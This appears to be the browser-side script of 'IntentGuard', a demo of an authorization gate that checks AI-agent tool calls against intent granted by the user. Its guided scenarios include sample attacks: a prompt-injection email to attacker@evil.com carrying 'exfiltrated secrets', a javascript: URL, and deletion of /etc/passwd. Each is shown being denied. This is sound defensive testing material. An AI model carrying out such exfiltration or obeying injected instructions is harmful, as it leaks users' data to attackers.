/* IntentGuard demo — behavior for the three folders: Authorize, Ledger, Parser lab. */

let mode = "observe";
let REGISTRY = [];
let CONFIG = null;        // /demo/config view
let adminToken = null;    // provisioning token typed in Setup, kept client-side

// ── folder tabs (hash-routed) ───────────────────────────────────────────────
const VIEWS = ["authorize", "ledger", "parser", "setup"];
function showView(name) {
  if (!VIEWS.includes(name)) name = "authorize";
  document.querySelectorAll(".view").forEach(v =>
    v.classList.toggle("active", v.id === "view-" + name));
  document.querySelectorAll("nav.tabs a").forEach(a => {
    if (a.dataset.view === name) a.setAttribute("aria-current", "page");
    else a.removeAttribute("aria-current");
  });
  if (name === "ledger") refreshAudit();
  if (name === "setup") loadConfig();
}
window.addEventListener("hashchange", () => showView(location.hash.slice(1)));

// ── mode toggle ─────────────────────────────────────────────────────────────
// mode "" means: send no override, let the server default (Setup folder) decide.
function modeHint() {
  const hints = {
    observe: "observe: every call goes through, but the ledger records what enforce would do",
    enforce: "enforce: real denials — outside-intent and malformed calls are refused",
    "": `server default: whatever Setup says (currently ${CONFIG ? CONFIG.mode : "…"})`,
  };
  return hints[mode];
}
document.querySelectorAll("#modeSwitch button").forEach(b => b.onclick = () => {
  mode = b.dataset.mode;
  document.querySelectorAll("#modeSwitch button").forEach(x => x.classList.toggle("on", x === b));
  document.getElementById("modeHint").textContent = modeHint();
});

// ── registry + tool constraints ─────────────────────────────────────────────
const ARG_PRESETS = {
  "email.send":      {to:"bob@example.com", subject:"Weekly notes", body:"Hi Bob — notes attached."},
  "calendar.read":   {},
  "calendar.create": {calendar:"work"},
  "http.get":        {url:"https://example.com/data"},
  "file.read":       {path:"/tmp/notes.txt"},
  "file.write":      {path:"/tmp/notes.txt", content:"hello"},
};

function resourceArgsOf(spec){
  if (Array.isArray(spec.resource_args)) return spec.resource_args;
  return spec.resource_arg ? [spec.resource_arg] : [];
}
function constraintText(a){
  const parts = [];
  if (a.type) parts.push(a.type);
  if (a.required) parts.push("required");
  if (a.enum) parts.push("one of " + JSON.stringify(a.enum));
  if (a.pattern) parts.push("pattern " + a.pattern);
  if (a.max_length != null) parts.push("≤" + a.max_length + " chars");
  return parts.join(" · ") || "no constraints";
}
function renderConstraints(){
  const spec = REGISTRY.find(t => t.name === toolEl.value);
  const el = document.getElementById("constraints");
  if (!spec){ el.innerHTML = "This tool is <b>not in the registry</b> — the allowlist gate will refuse it (<code>unknown_tool</code>)."; return; }
  const res = resourceArgsOf(spec);
  let html = `<b>${spec.name}</b> — ${spec.description || "no description"}<span class="c">🔑 resource argument: ${res.length ? res.map(r=>`<code>${r}</code>`).join(" + ") : "<i>none (binds to any resource)</i>"}${res.length ? " — must be present, or the call is denied <code>missing_resource</code>" : ""}</span>`;
  const args = spec.arguments || [];
  if (args.length){
    html += `<span class="c">📐 declared constraints (violations are denied <code>invalid_arguments</code>):</span>`;
    for (const a of args) html += `<span class="c">&nbsp;&nbsp;<code>${a.name}</code>: ${constraintText(a)}</span>`;
  } else {
    html += `<span class="c">📐 no argument constraints declared — any argument shapes are accepted.</span>`;
  }
  html += `<span class="c">✏️ undeclared arguments are never rejected — add anything to the JSON below.</span>`;
  el.innerHTML = html;
}
async function loadRegistry(){
  const r = await fetch("/demo/registry");
  REGISTRY = (await r.json()).tools || [];
  toolEl.innerHTML = REGISTRY.map(t=>`<option>${t.name}</option>`).join("")
    + `<option value="file.delete">file.delete (not in registry)</option>`;
  renderConstraints();
  setArgsFor(toolEl.value);
}

// ── grant rows ──────────────────────────────────────────────────────────────
const actionsEl = document.getElementById("actions");
function addRow(tool="email.send", resource="bob@example.com") {
  const div = document.createElement("div");
  div.className = "row";
  const opts = (REGISTRY.length ? REGISTRY.map(t=>t.name) : Object.keys(ARG_PRESETS));
  div.innerHTML = `
    <select class="t" aria-label="tool">${opts.map(t=>`<option ${t===tool?"selected":""}>${t}</option>`).join("")}</select>
    <input class="r" aria-label="resource" placeholder="resource (blank = any)" value="${resource}" />
    <button class="x" aria-label="remove action">✕</button>`;
  div.querySelector(".x").onclick = () => div.remove();
  actionsEl.appendChild(div);
}
addRow("email.send","bob@example.com");
addRow("calendar.read","");
document.getElementById("addAction").onclick = () => addRow();

const toolEl = document.getElementById("tool");
function setArgsFor(tool){
  document.getElementById("argJson").value = JSON.stringify(ARG_PRESETS[tool] ?? {});
}
toolEl.onchange = () => { renderConstraints(); setArgsFor(toolEl.value); };

// ── decision reasons ────────────────────────────────────────────────────────
const REASON_EXPLAIN = {
  in_intent: "<b>Allowed.</b> This exact tool → resource pair was granted in step 1 from the user's trusted request.",
  not_in_intent: "<b>Denied: outside the user's intent.</b> The session exists, but this tool → resource was never granted. This is the injection defense — corrupted instructions can't expand what the agent may do.",
  no_session: "<b>Denied: no grants.</b> Nothing has been granted for this session id + subject yet. Use step 1 first.",
  unknown_tool: "<b>Denied at the allowlist gate.</b> The tool isn't in the registry, so it can't be authorized at all — no store lookup happens.",
  invalid_arguments: "<b>Denied at the argument-shape gate.</b> An argument violates the tool's declared constraints (type / enum / pattern / max length) — the violation detail is below. Checked deterministically, before the policy store is consulted.",
  missing_resource: "<b>Denied at the resource-binding gate.</b> The argument carrying the security-relevant resource is missing or blank, so the call can't be bound to any specific grant. IntentGuard fails closed rather than let it match an \"any\" grant.",
  pdp_error_failclosed: "<b>Denied, fail-closed.</b> The policy store errored or timed out. In enforce mode the engine never fails open.",
  escalated_for_review: "<b>Escalated.</b> Outside the granted intent, but this tool is configured as escalatable — a human is asked to approve instead of a hard deny.",
};
const GATES = [
  {name:"1 · Allowlist", desc:"tool in registry?"},
  {name:"2 · Argument shape", desc:"types, enums, patterns, lengths"},
  {name:"3 · Resource binding", desc:"resource argument present?"},
  {name:"4 · Intent check", desc:"granted in policy store?"},
];
const REASON_GATE = {
  unknown_tool:0, invalid_arguments:1, missing_resource:2,
  in_intent:3, not_in_intent:3, no_session:3, pdp_error_failclosed:3, escalated_for_review:3,
};

// ── guided attempts ─────────────────────────────────────────────────────────
const SCENARIOS = [
  {title:"In intent", expect:"allow", sub:"email.send to bob — granted in step 1",
   tool:"email.send", args:{to:"bob@example.com", subject:"Weekly notes"}},
  {title:"Prompt injection", expect:"deny", sub:"same tool, attacker's recipient → not_in_intent",
   tool:"email.send", args:{to:"attacker@evil.com", body:"exfiltrated secrets"}},
  {title:"Bad URL scheme", expect:"deny", sub:"url must match https?:// → invalid_arguments",
   tool:"http.get", args:{url:"javascript:alert(1)"}},
  {title:"Wrong argument type", expect:"deny", sub:"path must be a string → invalid_arguments",
   tool:"file.write", args:{path:42, content:"x"}},
  {title:"Recipient not email-shaped", expect:"deny", sub:"to must match an email pattern → invalid_arguments",
   tool:"email.send", args:{to:"not-an-email"}},
  {title:"Unknown tool", expect:"deny", sub:"file.delete isn't in the registry → unknown_tool",
   tool:"file.delete", args:{path:"/etc/passwd"}},
  {title:"Missing resource", expect:"deny", sub:"no recipient: can't bind to a grant → missing_resource",
   tool:"email.send", args:{subject:"no recipient"}},
];
const scenEl = document.getElementById("scenarios");
for (const s of SCENARIOS){
  const b = document.createElement("button");
  b.className = "scenario";
  b.innerHTML = `<span class="t">${s.title}<span class="expect ${s.expect}">${s.expect.toUpperCase()}</span></span><small>${s.sub}</small>`;
  b.onclick = () => {
    if ([...toolEl.options].some(o => o.value === s.tool || o.text === s.tool)) toolEl.value = s.tool;
    document.getElementById("argJson").value = JSON.stringify(s.args);
    renderConstraints();
    decide(s.tool, s.args);
  };
  scenEl.appendChild(b);
}

// ── grant + decide ──────────────────────────────────────────────────────────
async function provision() {
  const allowed_actions = [...actionsEl.querySelectorAll(".row")].map(row => ({
    tool: row.querySelector(".t").value,
    resource: row.querySelector(".r").value.trim() || null,
  }));
  const body = {
    session_id: document.getElementById("session").value,
    subject: document.getElementById("subject").value,
    allowed_actions,
  };
  const headers = {"content-type":"application/json"};
  if (adminToken) headers["authorization"] = "Bearer " + adminToken;
  const r = await fetch("/v1/sessions", {method:"POST", headers, body:JSON.stringify(body)});
  if (r.status === 401 || r.status === 503) {
    document.getElementById("provNote").innerHTML =
      `✋ The write path refused this (${r.status}): provisioning auth is on. ` +
      `Enter the token in the <a href="#setup">Setup</a> folder and it will be sent automatically.`;
    return;
  }
  const j = await r.json();
  document.getElementById("provNote").innerHTML =
    `✔ ${j.grants_written} grants written for <b>${body.subject}</b> — intent is now frozen for this session.`;
  const chip = document.getElementById("sessChip");
  chip.className = "chip ok";
  chip.textContent = `● session ${body.session_id} · ${j.grants_written} grants — try an attempt`;
}

async function decide(tool, args) {
  const body = {
    session_id: document.getElementById("session").value,
    subject: document.getElementById("subject").value,
    tool, arguments: args,
  };
  if (mode) body.mode_override = mode;   // "" = use the server default from Setup
  const r = await fetch("/v1/decide", {method:"POST", headers:{"content-type":"application/json"}, body:JSON.stringify(body)});
  const v = await r.json();
  const detail = await refreshAudit(v.decision_id);
  showVerdict(v, detail);
}

function renderPipe(reason, decision){
  const fired = REASON_GATE[reason] ?? 3;
  return GATES.map((g, i) => {
    let cls = "gate";
    if (i < fired) cls += " passed";
    else if (i === fired) cls += " fired-" + decision;
    else cls += " notreached";
    return `<div class="${cls}"><b>${g.name}</b>${g.desc}</div>`;
  }).join("");
}

const STAMP_WORD = { allow:"Allowed", deny:"Denied", escalate:"Escalated" };
function showVerdict(v, detail) {
  const stamp = document.getElementById("stamp");
  stamp.className = "stamp " + v.decision;
  stamp.textContent = STAMP_WORD[v.decision] || v.decision;
  void stamp.offsetWidth;
  stamp.classList.add("inked");
  const effective = v.would_have_decided || v.decision;
  document.getElementById("pipe").innerHTML = renderPipe(v.reason, effective);
  let explain = REASON_EXPLAIN[v.reason] || "";
  if (v.would_have_decided && v.would_have_decided !== "allow")
    explain += ` <br>👁 <b>Observe mode:</b> the call went through, but the pipeline above shows what enforce would have done — flip the switch (top right) to enforce it.`;
  if (detail && detail !== "—")
    explain += ` <br>🔎 violation detail: <span class="err-detail">${detail}</span>`;
  document.getElementById("explain").innerHTML = explain;
  let kv = `reason <b>${v.reason}</b> &nbsp;·&nbsp; effective mode <b>${v.effective_mode}</b>`;
  if (v.would_have_decided) kv += ` &nbsp;·&nbsp; would have <b>${v.would_have_decided}</b>`;
  if (v.escalation_prompt) kv += `<br><br>🧑 <b>${v.escalation_prompt}</b>`;
  kv += `<br><span class="note">decision_id ${v.decision_id}</span>`;
  document.getElementById("verdictKv").innerHTML = kv;
  document.getElementById("verdict").classList.add("show");
}

async function refreshAudit(findDecisionId) {
  const r = await fetch("/v1/audit?limit=50");
  const j = await r.json();
  let detail = "—";
  const rows = j.entries.slice().reverse().map(e => {
    if (findDecisionId && e.decision_id === findDecisionId && e.error) detail = e.error;
    return `
    <tr>
      <td><span class="ministamp ${e.decision}">${(STAMP_WORD[e.decision] || e.decision).toUpperCase()}</span></td>
      <td class="code">${e.tool} → ${e.resource}</td>
      <td class="code">${e.reason}</td>
      <td>${e.error ? `<span class="err-detail">${e.error}</span>` : "—"}</td>
      <td>${e.effective_mode}</td>
      <td>${e.would_have_decided ?? "—"}</td>
      <td class="threats">${(e.owasp_threats||[]).join("<br>") || "—"}</td>
    </tr>`;
  }).join("");
  document.getElementById("audit").innerHTML = rows ||
    `<tr><td colspan="7" class="note">No decisions yet — grant a session in Authorize, then attempt a call.</td></tr>`;
  return detail;
}

document.getElementById("provision").onclick = provision;
document.getElementById("send").onclick = () => {
  let args;
  try { args = JSON.parse(document.getElementById("argJson").value || "{}"); }
  catch (e) { alert("Arguments must be valid JSON: " + e.message); return; }
  decide(toolEl.value, args);
};

// ── parser lab: case dossier + live eval ────────────────────────────────────
let EVAL_CASES = [];
let evalFilter = "all";
let lastResults = {};   // case id -> result row from the last run

const evalStatus = document.getElementById("evalStatus");
const evalButtons = [document.getElementById("evalSmoke"), document.getElementById("evalFull")];

function grantChips(list, never){
  if (!list.length) return never ? "" : "<span class='notrun'>nothing</span>";
  return list.map(g => `<span class="grantchip${never ? " never" : ""}">${never ? "never " : ""}${g}</span>`).join("");
}

function renderFilters(){
  const tags = [...new Set(EVAL_CASES.flatMap(c => c.tags))].sort();
  const counts = t => EVAL_CASES.filter(c => c.tags.includes(t)).length;
  const el = document.getElementById("caseFilters");
  el.innerHTML =
    `<button data-tag="all" class="${evalFilter==="all"?"on":""}">all (${EVAL_CASES.length})</button>` +
    tags.map(t => `<button data-tag="${t}" class="${evalFilter===t?"on":""}">${t} (${counts(t)})</button>`).join("");
  el.querySelectorAll("button").forEach(b => b.onclick = () => {
    evalFilter = b.dataset.tag;
    renderFilters(); renderCaseTable();
  });
}

function resultCell(id){
  const r = lastResults[id];
  if (!r) return `<span class="notrun">not run</span>`;
  const notes = [];
  if (r.leaks.length) notes.push(`<span class="err-detail">LEAKED: ${r.leaks.join(", ")}</span>`);
  if (r.missed.length) notes.push(`missed: ${r.missed.map(g=>`<code>${g}</code>`).join(", ")}`);
  if (r.extra.length) notes.push(`extra: ${r.extra.map(g=>`<code>${g}</code>`).join(", ")}`);
  if (r.overbroad.length) notes.push(`overbroad: ${r.overbroad.map(g=>`<code>${g}</code>`).join(", ")}`);
  return `<span class="ministamp ${r.ok ? "allow" : "deny"}">${r.ok ? "PASS" : "FAIL"}</span>` +
    (notes.length ? `<div class="notrun" style="margin-top:4px">${notes.join("<br>")}</div>` : "");
}

function renderCaseTable(){
  const rows = EVAL_CASES
    .filter(c => evalFilter === "all" || c.tags.includes(evalFilter))
    .map(c => `
    <tr>
      <td><div class="caseid">${c.id}</div><div class="casetags">${c.tags.join(" · ") || "—"}</div></td>
      <td><div class="reqtext">${c.request.replace(/&/g,"&amp;").replace(/</g,"&lt;")}</div></td>
      <td>${grantChips(c.expected, false)}</td>
      <td>${grantChips(c.forbidden, true) || "<span class='notrun'>—</span>"}</td>
      <td>${resultCell(c.id)}</td>
    </tr>`).join("");
  document.getElementById("evalRows").innerHTML = rows ||
    `<tr><td colspan="5" class="note">No cases match this filter.</td></tr>`;
}

async function loadEvalCases(){
  try {
    const r = await fetch("/demo/eval/cases");
    EVAL_CASES = (await r.json()).cases;
    const smoke = EVAL_CASES.filter(c => c.tags.includes("smoke")).length;
    evalButtons[0].textContent = `Run smoke subset (${smoke} cases)`;
    evalButtons[1].textContent = `Run full set (${EVAL_CASES.length} cases)`;
    renderFilters(); renderCaseTable();
  } catch (e) {
    evalStatus.textContent = "Could not load the case set: " + e.message;
  }
}

function metricChip(name, value, ok, hint){
  return `<div class="metric ${ok ? "pass" : "fail"}"><b>${value}</b><span>${name} · ${hint}</span></div>`;
}
function renderMetrics(j){
  const m = j.metrics, t = j.thresholds;
  const el = document.getElementById("evalMetrics");
  el.hidden = false;
  el.innerHTML =
    metricChip("precision", m.precision.toFixed(3), m.precision >= t.precision, `need ≥ ${t.precision}`) +
    metricChip("recall", m.recall.toFixed(3), m.recall >= t.recall, `need ≥ ${t.recall}`) +
    metricChip("over-breadth", m.overbreadth_rate.toFixed(3), m.overbreadth_rate <= t.overbreadth_rate, `need ≤ ${t.overbreadth_rate}`) +
    metricChip("leaks", m.leaks, m.leaks <= t.leaks, "must be 0");
}

async function runParserEval(tag){
  evalButtons.forEach(b => b.disabled = true);
  evalStatus.textContent = tag
    ? "Running the smoke subset against the live parser — about 15 seconds…"
    : "Running every case against the live parser — about a minute…";
  try {
    const r = await fetch("/demo/eval/run", {
      method:"POST", headers:{"content-type":"application/json"},
      body: JSON.stringify(tag ? {tag} : {}),
    });
    const j = await r.json();
    if (!r.ok){ evalStatus.textContent = j.detail || "The eval could not run."; return; }
    j.cases.forEach(c => { lastResults[c.id] = c; });
    renderMetrics(j); renderCaseTable();
    evalStatus.textContent = j.failures.length
      ? "Thresholds NOT met — " + j.failures.join("; ")
      : "All thresholds met.";
  } catch (e) {
    evalStatus.textContent = "The eval could not run: " + e.message;
  } finally {
    evalButtons.forEach(b => b.disabled = false);
  }
}
evalButtons[0].onclick = () => runParserEval("smoke");
evalButtons[1].onclick = () => runParserEval(null);

// ── setup folder: live engine configuration ─────────────────────────────────
function fillConfigForm(){
  const c = CONFIG;
  document.getElementById("cfgMode").value = c.mode;
  document.getElementById("cfgAllowlist").checked = c.enforce_tool_allowlist;
  document.getElementById("cfgTrust").checked = c.trust_explicit_resource;
  document.getElementById("cfgTimeout").value = c.pdp_timeout_seconds;
  document.getElementById("cfgEscalatable").value = c.escalatable_tools.join(", ");
  document.getElementById("cfgParser").value = c.intent_parser;
  document.getElementById("cfgParserAnthropic").textContent =
    `anthropic — live extraction (key ${c.anthropic_key_loaded ? "loaded" : "NOT loaded"})`;
  document.getElementById("cfgRequireAuth").checked = c.require_provisioning_auth;
  document.getElementById("cfgToken").placeholder =
    c.provisioning_token_set ? "token is set — type to replace" : "leave blank to keep unset";
  document.getElementById("modeHint").textContent = modeHint();
  renderSnippet();
}

function renderSnippet(){
  const c = CONFIG;
  const lines = [`export INTENTGUARD_MODE=${c.mode}`];
  if (!c.enforce_tool_allowlist) lines.push("export INTENTGUARD_ENFORCE_TOOL_ALLOWLIST=false");
  if (c.trust_explicit_resource) lines.push("export INTENTGUARD_TRUST_EXPLICIT_RESOURCE=true");
  if (c.pdp_timeout_seconds !== 2) lines.push(`export INTENTGUARD_PDP_TIMEOUT_SECONDS=${c.pdp_timeout_seconds}`);
  if (c.escalatable_tools.length) lines.push(`export INTENTGUARD_ESCALATABLE_TOOLS=${c.escalatable_tools.join(",")}`);
  if (c.intent_parser !== "mock") lines.push(`export INTENTGUARD_INTENT_PARSER=${c.intent_parser}`);
  if (c.require_provisioning_auth) lines.push("export INTENTGUARD_REQUIRE_PROVISIONING_AUTH=true");
  if (c.provisioning_token_set) lines.push("export INTENTGUARD_PROVISIONING_TOKEN=<your-secret>   # rotate regularly, never commit");
  lines.push("");
  lines.push("# Custom registry: save the Tool registry JSON below to a file, then:");
  lines.push("# export INTENTGUARD_TOOL_REGISTRY_PATH=/etc/intentguard/tools.json");
  lines.push("");
  lines.push("# Fixed while the demo runs — set for a real deployment:");
  lines.push("# export INTENTGUARD_BACKEND=openfga            # docker compose up -d && python -m engine.pdp.bootstrap");
  lines.push("# export INTENTGUARD_OPENFGA_STORE_ID=...");
  lines.push("# export INTENTGUARD_OPENFGA_MODEL_ID=...");
  lines.push("# export INTENTGUARD_AUDIT_PATH=/var/log/intentguard/audit.jsonl");
  document.getElementById("envSnippet").textContent = lines.join("\n");
}

async function loadConfig(){
  try {
    CONFIG = await (await fetch("/demo/config")).json();
    fillConfigForm();
  } catch (e) {
    document.getElementById("configStatus").textContent = "Could not load settings: " + e.message;
  }
}

document.getElementById("applyConfig").onclick = async () => {
  const status = document.getElementById("configStatus");
  const body = {
    mode: document.getElementById("cfgMode").value,
    enforce_tool_allowlist: document.getElementById("cfgAllowlist").checked,
    trust_explicit_resource: document.getElementById("cfgTrust").checked,
    pdp_timeout_seconds: parseFloat(document.getElementById("cfgTimeout").value),
    escalatable_tools: document.getElementById("cfgEscalatable").value
      .split(",").map(s => s.trim()).filter(Boolean),
    intent_parser: document.getElementById("cfgParser").value,
    require_provisioning_auth: document.getElementById("cfgRequireAuth").checked,
  };
  const typedToken = document.getElementById("cfgToken").value.trim();
  if (typedToken) body.provisioning_token = typedToken;
  const r = await fetch("/demo/config", {method:"POST",
    headers:{"content-type":"application/json"}, body:JSON.stringify(body)});
  const j = await r.json();
  if (!r.ok){ status.textContent = j.detail || "Settings were not applied."; return; }
  CONFIG = j;
  if (typedToken){ adminToken = typedToken; document.getElementById("cfgToken").value = ""; }
  fillConfigForm();
  status.textContent = "Applied — the engine is now running with these settings.";
  if (j.require_provisioning_auth && !j.provisioning_token_set)
    status.textContent += " Note: auth is required but no token is set, so all provisioning is refused (fail closed).";
};

document.getElementById("copySnippet").onclick = async () => {
  const note = document.getElementById("copyStatus");
  try {
    await navigator.clipboard.writeText(document.getElementById("envSnippet").textContent);
    note.textContent = "Copied.";
  } catch (e) { note.textContent = "Copy failed — select the block and copy manually."; }
  setTimeout(() => { note.textContent = ""; }, 2500);
};

// ── setup folder: registry editor ───────────────────────────────────────────
async function loadRegistryEditor(){
  const j = await (await fetch("/demo/registry")).json();
  document.getElementById("registryJson").value = JSON.stringify(j, null, 2);
}

document.getElementById("applyRegistry").onclick = async () => {
  const status = document.getElementById("registryStatus");
  let parsed;
  try { parsed = JSON.parse(document.getElementById("registryJson").value); }
  catch (e) { status.textContent = "Not valid JSON: " + e.message; return; }
  const r = await fetch("/demo/config/registry", {method:"POST",
    headers:{"content-type":"application/json"}, body:JSON.stringify(parsed)});
  const j = await r.json();
  if (!r.ok){ status.textContent = j.detail || "Registry was not applied."; return; }
  status.textContent = `Applied — the engine now knows ${j.tools.length} tools: ${j.tools.join(", ")}.`;
  loadRegistry();        // Authorize folder picks up the new tools + constraints
  loadRegistryEditor();
};

document.getElementById("reloadRegistry").onclick = () => {
  loadRegistryEditor();
  document.getElementById("registryStatus").textContent = "Reset to the running registry.";
};

// ── boot ────────────────────────────────────────────────────────────────────
showView(location.hash.slice(1) || "authorize");
loadRegistry();
refreshAudit();
loadEvalCases();
loadConfig();
loadRegistryEditor();
